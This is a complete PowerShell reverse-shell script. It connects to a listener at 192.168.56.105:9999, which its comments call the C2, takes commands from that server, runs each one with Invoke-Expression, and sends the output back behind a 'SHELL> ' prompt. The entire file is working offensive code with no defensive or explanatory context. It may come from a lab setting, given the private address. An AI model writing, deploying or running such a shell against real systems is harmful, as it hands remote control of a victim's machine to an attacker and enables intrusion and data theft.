# Define the server's IP address and port
$SERVER_HOST = "192.168.56.105"  # Replace with the server's IP address
$SERVER_PORT = 9999

# Create a TCP client object
$tcpClient = New-Object System.Net.Sockets.TcpClient

# Connect to the server
$tcpClient.Connect($SERVER_HOST, $SERVER_PORT)

# Create a stream object for sending and receiving data
$stream = $tcpClient.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)


# Receive commands from the server and execute them
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $writer.Write($String + 'SHELL> ')
    $writer.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}

$writer.Close()

# Close the connection
$stream.Close()
$tcpClient.Close()
